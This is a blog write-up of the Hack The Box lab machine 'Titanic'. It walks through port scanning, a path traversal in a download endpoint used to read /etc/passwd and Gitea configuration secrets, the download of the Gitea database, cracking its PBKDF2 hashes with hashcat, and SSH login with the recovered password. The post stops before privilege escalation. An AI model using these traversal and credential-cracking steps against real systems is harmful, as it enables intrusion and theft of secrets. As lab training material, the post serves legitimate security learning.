---
layout: post
title: 'Hack The Box - Machine Write-Up: Titanic'
created-at: 2025-02-20
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
---

## Enumeration and Analysis

> nmap 10.10.11.55

for average discovery. And for more detail on found ports:

```
> nmap -p22,80 -sC -sV 10.10.11.55   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 13:57 EST
Nmap scan report for 10.10.11.55
Host is up (0.73s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

So, it looks like there is a HTTP and a SSH server running.

First access to the HTTP page directly through the IP address resulted in a redirect to `titanic.htb`, but the name couldn't be solved:

![Titanic Unresolved Landing Page](/docs/assets/2025-02/htb-titanic-1.png)

Adding the entry `10.10.11.55    titanic.htb` to `/etc/hosts` solves the issue:

![Titanic Resolved Landing Page](/docs/assets/2025-02/htb-titanic-2.png)

The only option that does something is the "Book Now"  or "Book Your Trip", both resulting in the same form modal where you can input your information:

![Titanic Ticket booking form](/docs/assets/2025-02/htb-titanic-3.png)

This results in a JSON file being downloaded with your information. This is supposed to be the "ticket":

```json
{"name": "aaa", "email": "aaa@aaa.com", "phone": "568", "date": "2025-02-20", "cabin": "Standard"}
```

I then proxied the browser through `Burp Suite`, and could see on the response headers that the back-end is running on Python using a library called [Werkzeug](https://werkzeug.palletsprojects.com/en/stable/).

```
HTTP/1.1 302 FOUND
Date: Thu, 20 Feb 2025 19:04:23 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 303
Location: /download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json">/download?ticket=3a9220f2-862d-42ac-be2a-0cf076df835a.json</a>. If not, click the link.
```

I then searched "Werkzeug/3.0.3 Python/3.10.12" on Google and found this website: [werkzeug vulnerabilities](https://security.snyk.io/package/pip/werkzeug).

It lists a series of known vulnerabilities on Werkzeug, one of them being a [directory traversal that wasn't yet patched on 3.0.3 version](https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-8309091).

I then used `gobuster` to get a list of known paths that the application exposes:

```
> gobuster dir -u http://titanic.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/book                 (Status: 405) [Size: 153]
/download             (Status: 400) [Size: 41]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The obvious one for me is the `download` path, since it probably executes a file open to retrieve and return the file to the client.

I then messed around with it for a bit, trying different path levels, but it turned out that no back level was required at all:

```
> curl --path-as-is http://titanic.htb/download?ticket=/etc/passwd | grep /bin/bash 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1951  100  1951    0     0  14395      0 --:--:-- --:--:-- --:--:-- 14451
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

I then started going through known sensitive and configuration files from Apache and the system itself.

> Around this time I realized that requests done through `Burp Suite` repeated were easier to track and analyze than using the terminal.

I was able to locate the Apache config file:

```
GET /download?ticket=/etc/apache2/sites-enabled/000-default.conf HTTP/1.1
...
<VirtualHost *:80>
    ServerName titanic.htb
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ProxyRequests Off
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^titanic.htb$
    RewriteRule ^(.*)$ http://titanic.htb$1 [R=permanent,L]
</VirtualHost>
```

It looks like the application is running on port `5000` and that Apache `/` is redirecting to it.

I then looked into the machine's hosts file:

```
GET /download?ticket=/etc/hosts HTTP/1.1
...
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

It looks like there is a exposed `dev.` subdomain for the application 🤔.

Adding the entry `10.10.11.55    dev.titanic.htb` to `/etc/hosts` I was able to get:


![Titanic Dev Page](/docs/assets/2025-02/htb-titanic-4.png)

Looks like there is an exposed Git repository page 🤯.

For the other `titanic` host name assigned to `127.0.1.1`, it seems to just be a [bug fix](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=316099).

---

Looking through the available repositories I could find the root password for the MySql server: `MySQLP@$$w0rd!`

![Docker repo - MySql root password](/docs/assets/2025-02/htb-titanic-5.png)

I then proceeded to run the gitea docker-compose file locally, so I can go through the file structure and see what I'll be able to extract through the compromised path.

The applications file structure looks like this:

```
> sudo tree                    
.
└── data
    ├── git
    ├── gitea
    │   ├── conf
    │   │   └── app.ini
    │   └── log
    └── ssh
        ├── ssh_host_ecdsa_key
        ├── ssh_host_ecdsa_key.pub
        ├── ssh_host_ed25519_key
        ├── ssh_host_ed25519_key.pub
        ├── ssh_host_rsa_key
        └── ssh_host_rsa_key.pub
```

A lot of interesting files, let's see what I can find here.

I wasn't able to retrieve any of the `ssh/` subdirectory files, but `app.ini` also had some interesting stuff (I removed some uninteresting stuff from the content bellow):

```
> curl --path-as-is http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

...

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

...

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

...

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

...

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

Seems it's using a `sqlite` database, let's extract it:

```
> wget http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -O gitea.db
> sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> attach "gitea.db" as db1;
sqlite> .tables
...
sqlite> SELECT * FROM db1.user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|titan|titan||titan@titanic.htb|0|enabled|3fbfed64c0d1ee2a865bd6f3e9642712bf826bc12d45a54a424689d748cc22be2f962d18295369393f238c2d5b854b5fde6f|pbkdf2$50000$50|0|0|0||0|||2545a2d0a9c6fcb64bbf7a3bc6bf8a5a|c3cda4feaf7f2fbadd18b356ebffec6c|en-US||1740199580|1740199580|1740199580|0|-1|1|0|0|0|0|1|0|4305d60be890307b176c48ee9ae1ff3f|titan@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

Interesting, maybe we can get a password reuse.

```
...
sqlite> .header on
sqlite> .mode column
sqlite> pragma table_info('user');
cid  name                            type     notnull  dflt_value  pk
---  ------------------------------  -------  -------  ----------  --
...
4    email                           TEXT     1                    0 
...
7    passwd                          TEXT     1                    0 
8    passwd_hash_algo                TEXT     1        'argon2'    0 
...
26   is_admin                        INTEGER  0                    0 
...
sqlite> SELECT email, passwd_hash_algo, passwd, is_admin FROM user;
email                  passwd_hash_algo  passwd                                                        is_admin
---------------------  ----------------  ------------------------------------------------------------  --------
root@titanic.htb       pbkdf2$50000$50   cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d4  1       
                                         59c08d2dfc063b2406ac9207c980c47c5d017136                              

developer@titanic.htb  pbkdf2$50000$50   e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b  0       
                                         7cbc8efc5dbef30bf1682619263444ea594cfb56                              

titan@titanic.htb      pbkdf2$50000$50   3fbfed64c0d1ee2a865bd6f3e9642712bf826bc12d45a54a424689d748cc  0       
                                         22be2f962d18295369393f238c2d5b854b5fde6f                              
```

I had to do a little research on how to use `hashcat` to bruteforce `pbkdf2`. I then stumbled into [this reddit post](https://www.reddit.com/r/hacking/comments/1isc8l8/cracking_giteas_pbkdf2_password_hashes_with/) that leads to [this personal blog](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes) of [@unix-ninja](https://www.unix-ninja.com/) that made a tool specifically for formatting the `sqlite` output into a string that `hashcat` can work with:

```
> sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:w82k/q9/L7rdGLNW6//sbA==:P7/tZMDR7iqGW9bz6WQnEr+Ca8EtRaVKQkaJ10jMIr4vli0YKVNpOT8jjC1bhUtf3m8=
```

I let `hashcat` run for 4h (around 50%), and the only hash I was able to get is for the `developer@titanic.htb` account:

```
> hashcat hashes.txt /usr/share/wordlists/rockyou.txt -m 10900
...

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

...

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

Checking for password reuse:

```
> ssh developer@titanic.htb     
The authenticity of host 'titanic.htb (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
developer@titanic.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
...
developer@titanic:~$ 
```

Bingo!

## Inside the machine

// TODO: A little trolling